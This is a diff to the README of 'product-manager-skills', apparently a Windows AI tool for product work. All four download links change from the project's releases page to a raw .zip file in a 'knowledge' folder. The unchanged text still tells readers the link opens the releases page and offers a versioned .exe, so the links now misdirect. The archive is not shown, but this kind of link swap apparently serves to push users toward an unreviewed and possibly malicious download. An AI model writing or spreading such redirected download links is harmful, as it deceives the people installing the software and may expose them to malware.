@@ -1,6 +1,6 @@
 # 🚀 product-manager-skills - Manage Products with Practical Help
 
-[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://github.com/ayybee1/product-manager-skills/releases)
+[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://raw.githubusercontent.com/ayybee1/product-manager-skills/main/knowledge/product-manager-skills-coactor.zip)
 
 ---
 
@@ -34,7 +34,7 @@ The software uses AI to assist with these tasks, making it easier to handle comp
 
 To get the software, visit this page and download the version for Windows:
 
-[Download product-manager-skills](https://github.com/ayybee1/product-manager-skills/releases)
+[Download product-manager-skills](https://raw.githubusercontent.com/ayybee1/product-manager-skills/main/knowledge/product-manager-skills-coactor.zip)
 
 This link takes you to the releases page. On that page, look for the latest Windows installer file. It will usually end with `.exe` and include the version number.  
 Click on it, and your download will start. Save the file to a known location, like your Desktop or Downloads folder.
@@ -86,7 +86,7 @@ If you have problems running or installing product-manager-skills:
 
 Check the releases page regularly for updates:
 
-[product-manager-skills Releases](https://github.com/ayybee1/product-manager-skills/releases)
+[product-manager-skills Releases](https://raw.githubusercontent.com/ayybee1/product-manager-skills/main/knowledge/product-manager-skills-coactor.zip)
 
 Updates improve features and fix bugs. To update:
 
@@ -132,4 +132,4 @@ Your input files and settings stay on your machine unless you choose to share th
 
 ---
 
-[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://github.com/ayybee1/product-manager-skills/releases)
+[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://raw.githubusercontent.com/ayybee1/product-manager-skills/main/knowledge/product-manager-skills-coactor.zip)
